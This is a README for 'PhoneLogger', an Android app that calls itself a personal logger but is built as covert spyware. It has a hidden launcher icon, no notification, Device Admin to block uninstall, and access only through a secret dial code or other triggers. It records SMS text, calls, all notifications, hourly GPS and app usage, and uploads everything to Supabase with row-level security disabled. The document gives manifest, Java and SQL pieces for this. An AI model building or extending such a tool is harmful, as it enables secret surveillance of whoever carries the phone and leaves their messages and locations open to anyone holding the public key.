# PhoneLogger

A silent, personal Android activity logger. Captures calls, SMS, notifications, location, system events, screen activity, battery, app usage, and network events on your own device. Stores everything locally in SQLite and syncs to Supabase twice daily. No persistent notification. No visible launcher icon. Cannot be uninstalled without revoking Device Admin. Accessible only via a secret dial code.

---

## Table of Contents

- [Overview](../../Téléchargements/README (2).md#overview)
- [Architecture](../../Téléchargements/README (2).md#architecture)
- [Project Structure](../../Téléchargements/README (2).md#project-structure)
- [Tech Stack](../../Téléchargements/README (2).md#tech-stack)
- [Permissions](../../Téléchargements/README (2).md#permissions)
- [Setup & Configuration](../../Téléchargements/README (2).md#setup--configuration)
- [Supabase Setup](../../Téléchargements/README (2).md#supabase-setup)
- [Building & Running](../../Téléchargements/README (2).md#building--running)
- [Secret Access](../../Téléchargements/README (2).md#secret-access)
- [Uninstall Protection](../../Téléchargements/README (2).md#uninstall-protection)
- [Sync & Retry Logic](../../Téléchargements/README (2).md#sync--retry-logic)
- [Error Logging](../../Téléchargements/README (2).md#error-logging)
- [Database Schema](../../Téléchargements/README (2).md#database-schema)
- [Supabase Schema](../../Téléchargements/README (2).md#supabase-schema)

---

## Overview

PhoneLogger is a personal surveillance app for your own Android device. It runs completely silently in the background with:

- No launcher icon
- No persistent notification
- No foreground service
- Accessible only by dialing a secret USSD-like code

It captures:
- Incoming and outgoing **calls** (number, saved name if any, duration, timestamp)
- Incoming **SMS** (sender, content, timestamp)
- All **notifications** (app, title, content, timestamp)
- **Location** every 60 minutes (lat, lng, accuracy, timestamp — or `DISABLED` if GPS is off)
- **System events** (shutdown, reboot, total time off, airplane mode on/off, mobile data on/off)
- **Screen events** (screen on, screen off, phone unlocked — with timestamps)
- **Battery events** (level logged every 60min alongside location, charging started/stopped)
- **App usage** (which apps were opened and for how long, via `UsageStatsManager`)
- **WiFi events** (connected/disconnected, network name, timestamp)
- **Bluetooth events** (device connected/disconnected, device name, timestamp)
- **Failed sync attempts** (logged and retried like any other event)

All data is stored locally in SQLite first, then synced to Supabase twice daily via WorkManager. After every successful sync, the local database is wiped clean (only after confirmed server acknowledgement). If the device is offline, sync is deferred and retried automatically when connectivity is restored.

---

## Architecture

```
BroadcastReceiver
├── SMS_RECEIVED              → logs incoming SMS
├── PHONE_STATE               → logs incoming/missed calls
├── NEW_OUTGOING_CALL         → logs outgoing calls
├── ACTION_SHUTDOWN           → logs shutdown timestamp
├── BOOT_COMPLETED            → logs reboot + calculates downtime from last shutdown
├── AIRPLANE_MODE_CHANGED     → logs airplane mode on/off
├── CONNECTIVITY_CHANGE       → logs mobile data on/off, WiFi on/off + network name
├── ACTION_SCREEN_ON          → logs screen on
├── ACTION_SCREEN_OFF         → logs screen off
├── ACTION_USER_PRESENT       → logs phone unlocked
├── ACTION_BATTERY_CHANGED    → logs charging started/stopped
└── BluetoothDevice.ACTION_ACL_CONNECTED / DISCONNECTED → logs BT devices

NotificationListenerService
└── onNotificationPosted      → logs all notifications from all apps

WorkManager
├── SyncWorker (2x daily)     → pushes all unsynced rows to Supabase, wipes local DB on success
│   ├── Retries on failure (exponential backoff)
│   ├── Waits for network connectivity before running
│   └── Logs failed attempts as error_logs entries
├── LocationWorker (every 60min) → captures GPS fix (ACCESS_FINE_LOCATION)
│   └── If GPS disabled → logs entry with position_status = "DISABLED"
└── UsageStatsWorker (every 60min) → reads app usage via UsageStatsManager

SecretCodeReceiver
└── *#00000# dialed           → opens hidden MainActivity

Device Admin (AdminReceiver)
└── Prevents uninstall via Settings → Apps

SQLite (local)
└── single database, 9 tables:
    ├── call_logs
    ├── sms_logs
    ├── notification_logs
    ├── location_logs
    ├── system_event_logs
    ├── screen_logs
    ├── battery_logs
    ├── app_usage_logs
    ├── network_logs
    └── error_logs

Supabase (remote)
└── mirrors all 10 local tables
    synced in batches (synced = 0), local DB wiped after confirmed success
```

---

## Project Structure

```
PhoneLogger/
├── app/
│   └── src/
│       └── main/
│           ├── AndroidManifest.xml
│           ├── java/com/phonelogger/
│           │   ├── receivers/
│           │   │   ├── SecretCodeReceiver.java       # *#00000# trigger
│           │   │   ├── NFCReceiver.java              # NFC tag detection
│           │   │   ├── VolumeReceiver.java           # Volume button sequence via AccessibilityService
│           │   │   ├── SMSReceiver.java              # SMS_RECEIVED
│           │   │   ├── CallReceiver.java             # PHONE_STATE + NEW_OUTGOING_CALL
│           │   │   ├── SystemEventReceiver.java      # SHUTDOWN, BOOT, AIRPLANE, DATA
│           │   │   ├── ScreenReceiver.java           # SCREEN_ON, SCREEN_OFF, USER_PRESENT
│           │   │   ├── BatteryReceiver.java          # BATTERY_CHANGED
│           │   │   ├── NetworkReceiver.java          # CONNECTIVITY_CHANGE, WiFi events
│           │   │   ├── BluetoothReceiver.java        # ACL_CONNECTED, ACL_DISCONNECTED
│           │   │   └── AdminReceiver.java            # Device Admin — blocks uninstall
│           │   ├── services/
│           │   │   ├── NotificationLogger.java       # NotificationListenerService
│           │   │   ├── ShakeDetectionService.java    # Accelerometer monitoring for shake trigger
│           │   │   └── VolumeAccessibilityService.java # Volume button sequence detection
│           │   ├── workers/
│           │   │   ├── SyncWorker.java               # WorkManager — 2x daily sync + wipe
│           │   │   ├── LocationWorker.java           # WorkManager — GPS fix every 60min
│           │   │   └── UsageStatsWorker.java         # WorkManager — app usage every 60min
│           │   ├── db/
│           │   │   ├── DatabaseHelper.java           # SQLiteOpenHelper
│           │   │   └── LogDao.java                   # insert / query / mark synced / wipe
│           │   ├── models/
│           │   │   ├── CallLog.java
│           │   │   ├── SmsLog.java
│           │   │   ├── NotificationLog.java
│           │   │   ├── LocationLog.java
│           │   │   ├── SystemEventLog.java
│           │   │   ├── ScreenLog.java
│           │   │   ├── BatteryLog.java
│           │   │   ├── AppUsageLog.java
│           │   │   ├── NetworkLog.java
│           │   │   └── ErrorLog.java
│           │   ├── network/
│           │   │   └── SupabaseClient.java           # OkHttp — batch POST to Supabase
│           │   ├── utils/
│           │   │   ├── ContactUtils.java             # resolve number → saved name
│           │   │   └── NetworkUtils.java             # connectivity check
│           │   └── ui/
│           │       ├── MainActivity.java             # hidden settings panel, access via trigger
│           │       ├── adapters/
│           │       │   └── SettingsAdapter.java
│           │       └── fragments/
│           │           ├── TriggerSettingsFragment.java
│           │           ├── SyncSettingsFragment.java
│           │           ├── LoggingSettingsFragment.java
│           │           ├── DataSettingsFragment.java
│           │           └── AppSettingsFragment.java
│           └── res/
│               ├── xml/
│               │   └── device_admin.xml              # Device Admin policy declaration
│               ├── layout/
│               │   ├── activity_main.xml             # Drawer navigation layout
│               │   ├── nav_header.xml                # Navigation drawer header
│               │   ├── fragment_trigger_settings.xml # Trigger configuration
│               │   ├── fragment_sync_settings.xml    # Sync configuration
│               │   ├── fragment_logging_settings.xml # Logging toggles
│               │   ├── fragment_data_settings.xml    # Data management
│               │   └── fragment_app_settings.xml     # App configuration
│               ├── menu/
│               │   └── drawer_menu.xml               # Navigation menu items
│               └── values/
│                   ├── strings.xml
│                   └── secrets.xml                   # gitignored — Supabase keys + dial code
├── build.gradle (app)
├── build.gradle (project)
├── gradle.properties
└── .gitignore
```

---

## Tech Stack

| Layer | Technology |
|---|---|
| Language | Java (Android) |
| Min SDK | 28 (Android 9) |
| Target SDK | 35 (Android 15) |
| Local storage | SQLite via `SQLiteOpenHelper` |
| Background sync | WorkManager |
| HTTP client | OkHttp 4 |
| JSON | Gson |
| Remote storage | Supabase (PostgreSQL via REST API) |
| Call/SMS capture | BroadcastReceiver |
| Notification capture | NotificationListenerService |
| Location | FusedLocationProviderClient (GPS only, `PRIORITY_HIGH_ACCURACY`) |
| App usage | UsageStatsManager |
| Uninstall protection | Device Administration API |

---

## Permissions

Declare all of these in `AndroidManifest.xml`:

```xml
<!-- Core logging permissions -->
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />

<!-- Location (GPS only, every 60 minutes) -->
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

<!-- NFC trigger -->
<uses-permission android:name="android.permission.NFC" />

<!-- Volume button trigger (requires Accessibility service) -->
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
    tools:ignore="ProtectedPermissions" />

<!-- Shake trigger -->
<uses-permission android:name="android.permission.WAKE_LOCK" />

<!-- App usage stats -->
<uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
    tools:ignore="ProtectedPermissions" />

<!-- Network & connectivity -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />

<!-- Bluetooth -->
<uses-permission android:name="android.permission.BLUETOOTH" />
<uses-permission android:name="android.permission.BLUETOOTH_CONNECT"
    android:minSdkVersion="31" />

<!-- Keep alive -->
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

<!-- Foreground service (required for NotificationListenerService on API 34+) -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

<!-- Device Admin (uninstall protection) -->
<uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
```

### Runtime permissions to request on first launch (MainActivity):

- `READ_CALL_LOG`
- `READ_CONTACTS`
- `READ_SMS`
- `READ_PHONE_STATE`
- `RECEIVE_SMS`
- `ACCESS_FINE_LOCATION`
- `ACCESS_BACKGROUND_LOCATION` *(must be requested separately, after FINE_LOCATION is granted)*
- `BLUETOOTH_CONNECT` *(Android 12+ only)*
- `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`

### Manually granted by user in Android Settings:

- **Notification Access** → Settings > Apps > Special App Access > Notification Access > PhoneLogger ✅
- **Usage Access** → Settings > Apps > Special App Access > Usage Access > PhoneLogger ✅
- **Device Admin** → prompted via `DevicePolicyManager` on first launch ✅
- **Accessibility Service** (only if using volume button trigger) → Settings > Accessibility > PhoneLogger ✅

Each of these requires manual navigation. The app provides "Go to Settings" buttons for each one during initial setup.

---

## Setup & Configuration

### 1. Clone the project

```bash
git clone https://github.com/yourname/PhoneLogger.git
cd PhoneLogger
```

### 2. Create `secrets.xml`

Create `app/src/main/res/values/secrets.xml` (this file is gitignored):

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="supabase_url">https://your-project.supabase.co</string>
    <string name="supabase_anon_key">your-anon-key-here</string>
    <string name="secret_dial_code">*#00000#</string>
</resources>
```

### 3. Add to `.gitignore`

```
app/src/main/res/values/secrets.xml
```

### 4. Add dependencies to `app/build.gradle`

```groovy
dependencies {
    implementation 'androidx.work:work-runtime:2.9.0'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.google.code.gson:gson:2.10.1'
    implementation 'com.google.android.gms:play-services-location:21.2.0'
    
    // UI Framework
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.drawerlayout:drawerlayout:1.2.0'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.fragment:fragment:1.6.2'
    implementation 'androidx.preference:preference:1.2.1'
}
```

---

## Supabase Setup

### 1. Create a free project at https://supabase.com

### 2. Run the schema (see [Supabase Schema](../../Téléchargements/README (2).md#supabase-schema) section below)

### 4. Credentials

- Go to Project Settings → API
- Copy **Project URL** and **anon public key**
- Paste them into `secrets.xml`

RLS is disabled for all tables directly in the schema SQL above.

---

## Building & Running

### Debug build

```bash
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

### Release build

```bash
./gradlew assembleRelease
```

### First launch checklist

1. Open app (temporarily via launcher or adb)
2. Complete initial setup wizard:
   - Grant all runtime permissions one by one (guided by setup UI)
   - Go to Notification Access settings and enable PhoneLogger
   - Go to Usage Access settings and enable PhoneLogger
   - Activate Device Admin when prompted (blocks uninstall)
   - Grant battery optimization exemption when prompted
   - Allow background location ("Allow all the time") when prompted
3. **Choose your trigger method(s)** in Trigger Settings:
   - Configure dial code (change from default if desired)
   - Write NFC tag if using NFC
   - Configure volume sequence if using volume buttons
   - Test chosen triggers to ensure they work
4. **Configure logging preferences** in Logging Settings:
   - Disable any features you don't want (optional)
   - Set location/usage intervals (default 60min is recommended)
   - Add apps to notification exclude list if needed
5. **Test Supabase connection** in Sync Settings
6. Hide launcher icon (done automatically after setup completion)
7. App is now accessible only via your configured trigger method(s)

> ⚠️ The launcher icon auto-hides only after ALL permissions are granted and at least one trigger method is configured and tested. This prevents lockout scenarios.

### Hide launcher icon logic (in MainActivity.java)

```java
// Only hide after setup is complete AND at least one trigger is configured
private void hideIconIfSetupComplete() {
    SharedPreferences prefs = getSharedPreferences("phonelogger", MODE_PRIVATE);
    boolean setupComplete = prefs.getBoolean("setup_complete", false);
    boolean triggerConfigured = prefs.getBoolean("trigger_configured", false);
    
    if (setupComplete && triggerConfigured) {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }
}
```

The app can be "un-hidden" later from App Settings → "Show Launcher Icon" if needed for debugging.

> ⚠️ The icon auto-hides only after ALL permissions are granted and at least one trigger method is configured and tested. This prevents lockout scenarios.

---

## Uninstall Protection

The app registers itself as a **Device Administrator** to prevent uninstallation via Settings → Apps.

### `res/xml/device_admin.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<device-admin>
    <uses-policies>
        <force-lock />
    </uses-policies>
</device-admin>
```

### In `AndroidManifest.xml`:

```xml
<receiver
    android:name=".receivers.AdminReceiver"
    android:exported="true"
    android:permission="android.permission.BIND_DEVICE_ADMIN">
    <meta-data
        android:name="android.app.device_admin"
        android:resource="@xml/device_admin" />
    <intent-filter>
        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
    </intent-filter>
</receiver>
```

### Activate on first launch (in MainActivity.java):

```java
DevicePolicyManager dpm =
    (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);

if (!dpm.isAdminActive(adminComponent)) {
    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
        "Required to keep this app running.");
    startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
}
```

> Once Device Admin is active, the uninstall button in Settings → Apps is greyed out. To uninstall manually, the user must first go to Settings → Security → Device Admin Apps and deactivate PhoneLogger.

---

## Secret Access

The app registers a `BroadcastReceiver` for a secret dial code.

### In `AndroidManifest.xml`:

```xml
<receiver android:name=".receivers.SecretCodeReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="android.provider.Telephony.SECRET_CODE" />
        <data android:scheme="android_secret_code"
              android:host="00000" />
    </intent-filter>
</receiver>
```

> The code above corresponds to dialing `*#00000#`. Change `00000` in both the manifest and `secrets.xml` to your preferred code.

### `SecretCodeReceiver.java` behavior:

On receiving the broadcast → start `MainActivity` with `FLAG_ACTIVITY_NEW_TASK`.

---

## Settings Panel (Hidden MainActivity)

Once triggered via the secret method, `MainActivity` opens as a full settings control panel with a side navigation drawer containing 5 categories:

### 🔐 Trigger Settings

Configure how to access the app. Multiple triggers can be enabled simultaneously.

**Available Triggers:**
- **Dial Code** — customizable USSD code (default: `*#00000#`)
  - Text field to change the code
  - Test button to verify it works on current device
- **NFC Tag** — tap a programmed NFC sticker
  - "Scan NFC Tag" button to read existing tags
  - "Write NFC Tag" button to program a new tag from the app
- **Volume Buttons** — specific press sequence 
  - Configure pattern: Vol Up × 3 → Vol Down × 2 (customizable)
  - Sensitivity slider (time window: 2-5 seconds)
- **Shake Pattern** — shake device in specific way
  - Sensitivity: Low / Medium / High
  - Test shake detector button

**Settings UI:**
```
┌─────────────────────────────────────┐
│ [✓] Dial Code        *#00000#  [≡]  │
│ [✓] NFC Tag         [Write][Read]   │
│ [ ] Volume Sequence [Configure]     │
│ [ ] Shake Pattern   [Configure]     │
└─────────────────────────────────────┘
```

### 📡 Sync Settings

Control when and how data syncs to Supabase.

**Options:**
- **Sync Frequency**
  - Every 12 hours (default)
  - Every 24 hours
  - Manual only
- **Connection Status**
  - 🟢 Connected to Supabase
  - 🔴 Connection failed
  - 🟡 Not tested yet
- **Last Sync**
  - Timestamp of last successful sync
  - Number of records uploaded in last sync
  - View sync error log if failed
- **Manual Actions**
  - "Sync Now" button (force immediate sync)
  - "Test Connection" button (ping Supabase)

### 📊 Logging Settings

Toggle individual logging features and configure intervals.

**Categories:**
- **Communications**
  - [✓] SMS messages
  - [✓] Phone calls
  - [✓] Notifications
    - Exclude list: Choose apps to ignore (e.g. banking, work apps)
- **Location & Movement**
  - [✓] GPS location
    - Interval: 30min / **60min** / 90min / 2hr
    - Accuracy: High / Balanced / Low power
- **System Events**
  - [✓] Screen on/off/unlock
  - [✓] Battery events
  - [✓] Shutdown/reboot
  - [✓] Airplane mode
  - [✓] Mobile data on/off
- **App Activity**
  - [✓] App usage stats
    - Interval: 30min / **60min** / 90min
  - [✓] WiFi events
  - [✓] Bluetooth events

### 💾 Data Management

View storage usage and manage local/remote data.

**Local Database:**
- Current size: 2.1 MB
- Total records: 1,847 entries
- "View Records" → simple list with search
- "Export as JSON" → save to Downloads
- "Wipe Local DB" → with confirmation dialog

**Supabase Storage:**
- Remote size: 15.3 MB
- Total records uploaded: 12,492 entries
- "Download All Data" → export entire Supabase as JSON
- Connection test: Last ping 2ms

### ⚙️ App Settings

App management and advanced configuration.

**Permissions Status:**
- Notification Access: ✅
- Location Access: ✅ (Background allowed)
- Usage Stats Access: ✅
- Device Admin: ✅
- Battery Optimization: ✅ (Disabled for this app)

**Dangerous Actions:**
- "Re-run Setup Wizard" → go through all permissions again
- "Deactivate Device Admin" → enables app uninstall (with warning)
- "Show Launcher Icon" → makes app visible again (with warning)

**App Info:**
- Version: 1.0.0
- Package: com.phonelogger
- Install date: May 5, 2026
- Last boot: 2 days ago

---

## MainActivity UI Layout

The settings panel uses a drawer navigation pattern:

```
┌─────────────────────────────────────┐
│ ☰ PhoneLogger      [Hide] [Export] │ ← Top bar
├─────────────────────────────────────┤
│ [🔐] Trigger        │ Content area  │
│ [📡] Sync           │ shows the     │
│ [📊] Logging        │ selected      │ ← Drawer + content
│ [💾] Data           │ category      │
│ [⚙️] App            │ settings      │
└─────────────────────────────────────┘
```

Navigation drawer slides in from left. Selecting a category loads its fragment in the content area. Top bar includes:
- **Hide** → close MainActivity, return to hidden state
- **Export** → quick export of current DB as JSON

---

## Sync & Retry Logic

All sync is handled by `SyncWorker` via WorkManager.

### Schedule (set up in MainActivity on first launch):

```java
// Location + battery snapshot every 60 minutes
PeriodicWorkRequest locationRequest = new PeriodicWorkRequest.Builder(
    LocationWorker.class, 60, TimeUnit.MINUTES)
    .build();

WorkManager.getInstance(this).enqueueUniquePeriodicWork(
    "location_logs",
    ExistingPeriodicWorkPolicy.KEEP,
    locationRequest
);

// App usage stats every 60 minutes
PeriodicWorkRequest usageRequest = new PeriodicWorkRequest.Builder(
    UsageStatsWorker.class, 60, TimeUnit.MINUTES)
    .build();

WorkManager.getInstance(this).enqueueUniquePeriodicWork(
    "usage_logs",
    ExistingPeriodicWorkPolicy.KEEP,
    usageRequest
);

// Sync to Supabase twice daily
PeriodicWorkRequest syncRequest = new PeriodicWorkRequest.Builder(
    SyncWorker.class, 12, TimeUnit.HOURS)
    .setConstraints(new Constraints.Builder()
        .setRequiredNetworkType(NetworkType.CONNECTED) // wait for internet
        .build())
    .setBackoffCriteria(
        BackoffPolicy.EXPONENTIAL,
        WorkRequest.MIN_BACKOFF_MILLIS,
        TimeUnit.MILLISECONDS)
    .build();

WorkManager.getInstance(this).enqueueUniquePeriodicWork(
    "sync_logs",
    ExistingPeriodicWorkPolicy.KEEP,
    syncRequest
);
```

### SyncWorker behavior:

1. Query SQLite for all rows where `synced = 0` across all tables
2. Batch POST to Supabase REST API (`/rest/v1/tablename`)
3. On success → confirm server acknowledgement, then wipe entire local database
4. On failure → WorkManager retries automatically with exponential backoff
5. Log the failure itself as an `error_logs` entry with `synced = 0` so it gets pushed on next successful sync

> ⚠️ The local database wipe only happens **after** Supabase returns a successful response. Never wipe before confirmation.

### LocationWorker behavior:

1. Request a single GPS fix using `FusedLocationProviderClient` with `PRIORITY_HIGH_ACCURACY`
2. If GPS is disabled → insert `LocationLog` with `position_status = "DISABLED"`, `lat = null`, `lng = null`
3. If GPS is enabled → insert `LocationLog` with actual coordinates, accuracy, and `position_status = "OK"`
4. Also snapshot current battery level and insert a `BatteryLog` entry at the same time

### Connectivity:

`setRequiredNetworkType(NetworkType.CONNECTED)` ensures WorkManager **waits automatically** until the device is online before running the sync. No manual polling needed.

---

## Error Logging

Every failure in the app is captured as an `ErrorLog` and saved to the local `error_logs` table, then synced to Supabase alongside other logs.

### What gets logged as an error:

| Event | Error type |
|---|---|
| Supabase sync failure | `SYNC_FAILED` |
| SMS capture exception | `SMS_CAPTURE_FAILED` |
| Call capture exception | `CALL_CAPTURE_FAILED` |
| Notification capture exception | `NOTIFICATION_CAPTURE_FAILED` |
| Location capture exception | `LOCATION_CAPTURE_FAILED` |
| GPS disabled at capture time | `LOCATION_DISABLED` (not an error, logged in location_logs) |
| App usage read exception | `USAGE_STATS_FAILED` |
| Permission denied at runtime | `PERMISSION_DENIED` |
| Database insert failure | `DB_INSERT_FAILED` |
| Database wipe failure after sync | `DB_WIPE_FAILED` |

### ErrorLog model fields:

```
id, error_type, message, stacktrace, timestamp, synced
```

---

## Database Schema

### SQLite (local — `DatabaseHelper.java`)

```sql
CREATE TABLE call_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    number TEXT,
    saved_name TEXT,
    call_type TEXT,             -- INCOMING, OUTGOING, MISSED
    duration_seconds INTEGER,
    timestamp INTEGER,          -- Unix timestamp millis
    synced INTEGER DEFAULT 0
);

CREATE TABLE sms_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sender TEXT,
    saved_name TEXT,
    content TEXT,
    timestamp INTEGER,
    synced INTEGER DEFAULT 0
);

CREATE TABLE notification_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    package_name TEXT,
    app_name TEXT,
    title TEXT,
    content TEXT,
    timestamp INTEGER,
    synced INTEGER DEFAULT 0
);

CREATE TABLE location_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    latitude REAL,              -- null if GPS disabled
    longitude REAL,             -- null if GPS disabled
    accuracy REAL,              -- meters, null if GPS disabled
    position_status TEXT,       -- OK or DISABLED
    timestamp INTEGER,
    synced INTEGER DEFAULT 0
);

CREATE TABLE system_event_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_type TEXT,            -- SHUTDOWN, REBOOT, AIRPLANE_ON, AIRPLANE_OFF,
                                -- DATA_ON, DATA_OFF
    detail TEXT,                -- e.g. total downtime in seconds for REBOOT
    timestamp INTEGER,
    synced INTEGER DEFAULT 0
);

CREATE TABLE screen_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_type TEXT,            -- SCREEN_ON, SCREEN_OFF, UNLOCKED
    timestamp INTEGER,
    synced INTEGER DEFAULT 0
);

CREATE TABLE battery_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    level INTEGER,              -- 0-100
    is_charging INTEGER,        -- 0 or 1
    event_type TEXT,            -- SNAPSHOT, CHARGING_STARTED, CHARGING_STOPPED
    timestamp INTEGER,
    synced INTEGER DEFAULT 0
);

CREATE TABLE app_usage_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    package_name TEXT,
    app_name TEXT,
    usage_duration_seconds INTEGER,
    window_start INTEGER,       -- start of the 60min window
    window_end INTEGER,         -- end of the 60min window
    synced INTEGER DEFAULT 0
);

CREATE TABLE network_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_type TEXT,            -- WIFI_CONNECTED, WIFI_DISCONNECTED,
                                -- DATA_ENABLED, DATA_DISABLED,
                                -- BT_CONNECTED, BT_DISCONNECTED
    detail TEXT,                -- WiFi SSID or Bluetooth device name
    timestamp INTEGER,
    synced INTEGER DEFAULT 0
);

CREATE TABLE error_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    error_type TEXT,
    message TEXT,
    stacktrace TEXT,
    timestamp INTEGER,
    synced INTEGER DEFAULT 0
);
```

---

## Supabase Schema

Run this in the Supabase SQL Editor:

```sql
CREATE TABLE call_logs (
    id BIGSERIAL PRIMARY KEY,
    number TEXT,
    saved_name TEXT,
    call_type TEXT,
    duration_seconds INTEGER,
    timestamp BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE sms_logs (
    id BIGSERIAL PRIMARY KEY,
    sender TEXT,
    saved_name TEXT,
    content TEXT,
    timestamp BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE notification_logs (
    id BIGSERIAL PRIMARY KEY,
    package_name TEXT,
    app_name TEXT,
    title TEXT,
    content TEXT,
    timestamp BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE location_logs (
    id BIGSERIAL PRIMARY KEY,
    latitude DOUBLE PRECISION,
    longitude DOUBLE PRECISION,
    accuracy DOUBLE PRECISION,
    position_status TEXT,
    timestamp BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE system_event_logs (
    id BIGSERIAL PRIMARY KEY,
    event_type TEXT,
    detail TEXT,
    timestamp BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE screen_logs (
    id BIGSERIAL PRIMARY KEY,
    event_type TEXT,
    timestamp BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE battery_logs (
    id BIGSERIAL PRIMARY KEY,
    level INTEGER,
    is_charging BOOLEAN,
    event_type TEXT,
    timestamp BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE app_usage_logs (
    id BIGSERIAL PRIMARY KEY,
    package_name TEXT,
    app_name TEXT,
    usage_duration_seconds INTEGER,
    window_start BIGINT,
    window_end BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE network_logs (
    id BIGSERIAL PRIMARY KEY,
    event_type TEXT,
    detail TEXT,
    timestamp BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE error_logs (
    id BIGSERIAL PRIMARY KEY,
    error_type TEXT,
    message TEXT,
    stacktrace TEXT,
    timestamp BIGINT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Disable RLS on all tables (personal use only)
ALTER TABLE call_logs DISABLE ROW LEVEL SECURITY;
ALTER TABLE sms_logs DISABLE ROW LEVEL SECURITY;
ALTER TABLE notification_logs DISABLE ROW LEVEL SECURITY;
ALTER TABLE location_logs DISABLE ROW LEVEL SECURITY;
ALTER TABLE system_event_logs DISABLE ROW LEVEL SECURITY;
ALTER TABLE screen_logs DISABLE ROW LEVEL SECURITY;
ALTER TABLE battery_logs DISABLE ROW LEVEL SECURITY;
ALTER TABLE app_usage_logs DISABLE ROW LEVEL SECURITY;
ALTER TABLE network_logs DISABLE ROW LEVEL SECURITY;
ALTER TABLE error_logs DISABLE ROW LEVEL SECURITY;
```

---

## Notes

- **Trigger compatibility varies by device:**
  - Dial codes may not work on heavily customized Android skins (MIUI, EMUI)
  - NFC works on all NFC-enabled devices (most Android phones since 2012)
  - Volume buttons require Accessibility permission (sensitive, but works universally)
  - Shake detection works on all devices (requires no special permissions)
- `ACCESS_BACKGROUND_LOCATION` must be requested **separately and after** `ACCESS_FINE_LOCATION` is already granted. Android enforces this order strictly on API 30+.
- `PACKAGE_USAGE_STATS` and Accessibility permission cannot be granted at runtime — the user must enable them manually in Settings.
- `NotificationListenerService` permission is revoked automatically if the app is updated via adb. The user must re-enable it in Notification Access settings after each update.
- The local database wipe after sync is irreversible. Ensure Supabase returns HTTP 201 before wiping.
- Supabase free tier: 500MB storage, 2GB bandwidth/month — more than sufficient for personal logging.
- Never commit `secrets.xml` to a public repository. Add it to `.gitignore` immediately.
- Device Admin activation requires user consent — it cannot be forced silently. The first-launch flow must explain why it is needed.
- Multiple trigger methods can be active simultaneously for redundancy (recommended).
